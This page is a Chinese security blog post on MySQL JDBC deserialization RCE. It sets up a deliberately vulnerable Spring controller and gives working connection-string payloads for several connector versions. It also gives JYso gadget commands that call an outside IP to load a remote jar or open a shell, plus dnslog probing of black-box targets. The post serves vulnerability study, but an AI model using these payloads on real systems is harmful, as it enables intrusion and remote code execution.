@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Tools mysql-fake-server（推荐）：https:&#x2F;&#x2F;github.com&#x2F;4ra1n&#x2F;mysql-fake-server MySQL_Fake_Server：https:&#x2F;&#x2F;github.com&#x2F;fnmsd&#x2F;MySQL_Fake_Server Jyso：https:&#x2F;&#x2F;github.com&#x2F;qi4L&#x2F;JYso  环境部署创建项目时，java版本设置为1.8方面后续操作目前直接使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JDBC反序列化分析">
+<meta property="og:url" content="http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Z1sec-Blog">
+<meta property="og:description" content="Tools mysql-fake-server（推荐）：https:&#x2F;&#x2F;github.com&#x2F;4ra1n&#x2F;mysql-fake-server MySQL_Fake_Server：https:&#x2F;&#x2F;github.com&#x2F;fnmsd&#x2F;MySQL_Fake_Server Jyso：https:&#x2F;&#x2F;github.com&#x2F;qi4L&#x2F;JYso  环境部署创建项目时，java版本设置为1.8方面后续操作目前直接使">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240718093833.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240716161609.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240716161906.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240716162436.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240717103354.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240717103643.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802052209.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802053309.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802053523.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802053625.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802053702.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802054306.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802054733.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802054927.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802055029.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802060251.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802062931.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802063337.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802071345.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802071531.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802071731.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802071832.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802071946.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802072935.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802074509.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802074627.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802074751.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802075018.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240802075106.png">
+<meta property="article:published_time" content="2024-08-02T16:08:43.000Z">
+<meta property="article:modified_time" content="2024-08-02T16:20:21.532Z">
+<meta property="article:author" content="z1">
+<meta property="article:tag" content="Jdbc, 反序列化, Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240718093833.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>JDBC反序列化分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/22/DotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&text=JDBC反序列化分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&is_video=false&description=JDBC反序列化分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JDBC反序列化分析&body=Check out this article: http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&title=JDBC反序列化分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&name=JDBC反序列化分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/&t=JDBC反序列化分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tools"><span class="toc-number">1.</span> <span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="toc-number">2.</span> <span class="toc-text">环境部署</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%89%88%E6%9C%AC"><span class="toc-number">3.1.</span> <span class="toc-text">获取目标版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9Payload%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">修改Payload直接执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tips-%E6%9C%AA%E7%9F%A5Gadget%E5%88%A9%E7%94%A8DNSLOG%E8%BF%9B%E8%A1%8C%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">Tips: 未知Gadget利用DNSLOG进行探测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">反序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-Jdbc"><span class="toc-number">4.1.</span> <span class="toc-text">What is Jdbc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3%E9%93%BE"><span class="toc-number">4.3.</span> <span class="toc-text">JDBC反序列化入口链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#detectCustomCollations%E9%93%BE"><span class="toc-number">4.3.1.</span> <span class="toc-text">detectCustomCollations链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ServerStatusDiffInterceptor%E9%93%BE"><span class="toc-number">4.3.2.</span> <span class="toc-text">ServerStatusDiffInterceptor链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">4.4.</span> <span class="toc-text">利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.4.1.</span> <span class="toc-text">0x01 环境介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E4%BB%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="toc-number">4.4.2.</span> <span class="toc-text">0x02 代码流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        JDBC反序列化分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">z1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-02T16:08:43.000Z" class="dt-published" itemprop="datePublished">2024-08-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java/" rel="tag">Jdbc, 反序列化, Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><ul>
+<li>mysql-fake-server（推荐）：<a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></li>
+<li>MySQL_Fake_Server：<a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></li>
+<li>Jyso：<a target="_blank" rel="noopener" href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a></li>
+</ul>
+<h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h1><p>创建项目时，java版本设置为1.8方面后续操作<br>目前直接使用Spring Initializr创建spring boot应用将无法选择java8版本，将服务器地址设置为阿里云地址即可解决：<a target="_blank" rel="noopener" href="https://start.aliyun.com/">https://start.aliyun.com/</a><br>java1.8 JDK对应 java为8版本<br><img src="/images/Pasted%20image%2020240718093833.png"></p>
+<p>Maven设置，mysql-connector-java版本应设置到5.1.0-5.1.18或5.1.19-5.1.28或5.1.29-5.1.48或6.0.2-6.0.6或8.0.7-8.0.20范围内，对于不同的版本，Payload也会有所差别。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.29<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 版本号可以根据需要修改 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 用于使用CC链进行复现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>写一个controller，用于控制JDBC连接字符串</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.spring.controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@RestController</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqltestController</span> &#123;  </span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/jdbctest&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDataFromRemoteDB</span><span class="params">(String exp, String username, String password)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> exp;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url,username,password);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;over&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>下载mysql-fake-server cli版本（无图形化），java运行即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar fake-mysql-cli-0.0.4.jar -p 60003</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240716161609.png"></p>
+<p>注：在黑盒情况下，我们可以通过尝试建立连接来确定目标mysql-connector-java版本以此确定目标是否在攻击范围内。</p>
+<h2 id="获取目标版本"><a href="#获取目标版本" class="headerlink" title="获取目标版本"></a>获取目标版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jdbctest?exp=jdbc:mysql://xxx:60003/test&amp;user=ro&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p>成功获取版本，5.1.29在可攻击范围内。<br><img src="/images/Pasted%20image%2020240716161906.png"></p>
+<h2 id="修改Payload直接执行命令"><a href="#修改Payload直接执行命令" class="headerlink" title="修改Payload直接执行命令"></a>修改Payload直接执行命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jdbctest?exp=jdbc%3Amysql%3A%2F%2F117.72.39.110%3A60003%2Ftest%3FautoDeserialize%3Dtrue%26statementInterceptors%3Dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user%3Ddeser_CC31_open%20-a%20Calculator&amp;user=ro&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p>观察下payload，由于此处是在url中传参，所以上步需要将jdbc连接字符串url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://xxx:60003/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator</span><br></pre></td></tr></table></figure>
+<p>此处CC31实际上是CC3.1，也就是CC6的链。</p>
+<p>成功执行命令：<code>open -a Calculator</code><br><img src="/images/Pasted%20image%2020240716162436.png"></p>
+<h3 id="Tips-未知Gadget利用DNSLOG进行探测"><a href="#Tips-未知Gadget利用DNSLOG进行探测" class="headerlink" title="Tips: 未知Gadget利用DNSLOG进行探测"></a>Tips: 未知Gadget利用DNSLOG进行探测</h3><p>针对真实网络情况下，无法快速判断Gadget利用链，可使用Jyso生成序列化数据，使用dnslog进行快速获取支持链。</p>
+<p>使用Jyso生成Dnslog链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ~/tools/jyso/JYso-<span class="number">3.5</span>.jar -yso <span class="number">1</span> -g URLDNS -p <span class="string">&quot;all:lod8w01rxs32k4caie1wiqpsajge44st.oastify.com&quot;</span> | base64 -w <span class="number">0</span> &gt; gadget.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用fake-mysql-cli创建服务端，并且指定gadget内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar fake-mysql-cli-0.0.4.jar -f gadget.txt -p 60003</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240717103354.png"></p>
+<p>选择deser_CUSTOM选择自定义的gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jdbctest?exp=jdbc%3Amysql%3A%2F%2F117.72.39.110%3A60003%2Ftest%3FautoDeserialize%3Dtrue%26statementInterceptors%3Dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user%3Ddeser_CUSTOM&amp;user=ro&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p>成功获取dnslog，支持链指向：cc31或cc321<br><img src="/images/Pasted%20image%2020240717103643.png"></p>
+<p>注意：若程序判断目标系统内无可用Gadget链，则可能无法收到dnslog，此时可使用常规dnslog链对目标进行探测，以排查是否存在反序列化利用点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java -jar ~/tools/jyso/JYso-3.5.jar -yso 1 -g CommonsCollections6 -p &quot;JD-ldap://117.72.39.110:60007/SpringController/shell/-t cmd&quot; | base64 -w 0 &gt; gadget.txt</span><br><span class="line"></span><br><span class="line">java -jar ~/tools/jyso/JYso-3.5.jar -yso 1 -g CommonsCollections6 -p &quot;JD-ldap://117.72.39.110:60007/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==&quot; | base64 -w 0 &gt; gadget.txt</span><br><span class="line"></span><br><span class="line">java -jar ~/tools/jyso/JYso-3.5.jar -yso 1 -g CommonsCollections6 -p &quot;RC-http://117.72.39.110:60006/DateUtil.jar#DateUtil&quot; | base64 -w 0 &gt; gadget.txt</span><br><span class="line"></span><br><span class="line">java -jar ~/tools/jyso/JYso-3.5.jar -yso 1 -g CommonsCollections6 -p &quot;EX-MS-SpringControllerMS-cmd&quot; | base64 -w 0 &gt; gadget.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><h2 id="What-is-Jdbc"><a href="#What-is-Jdbc" class="headerlink" title="What is Jdbc"></a>What is Jdbc</h2><p>JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。  </p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Mysql JDBC 中包含一个危险的扩展参数： “autoDeserialize”。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。</p>
+<p>此外通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被<code>ObjectInputStream.readObject()</code>进行反序列化处理。</p>
+<p>所以若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发<code>ObjectInputStream.readObject()</code>，构造反序列化利用链即可造成RCE。  </p>
+<h2 id="JDBC反序列化入口链"><a href="#JDBC反序列化入口链" class="headerlink" title="JDBC反序列化入口链"></a>JDBC反序列化入口链</h2><h3 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h3><p>此链涉及Jdbc多版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">5.1.19-5.1.28：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">5.1.29-5.1.48：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">6.0.2-6.0.6：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span><br></pre></td></tr></table></figure>
+
+<h3 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5.1.0-5.1.10：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc  连接后需执行查询</span><br><span class="line"></span><br><span class="line">5.1.11-5.x.xx：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span><br><span class="line"></span><br><span class="line">6.x：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc  （包名中添加cj）</span><br><span class="line"></span><br><span class="line">8.0.20以下：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><h3 id="0x01-环境介绍"><a href="#0x01-环境介绍" class="headerlink" title="0x01 环境介绍"></a>0x01 环境介绍</h3><p>此次分析使用的mysql-connector-java版本是5.1.29</p>
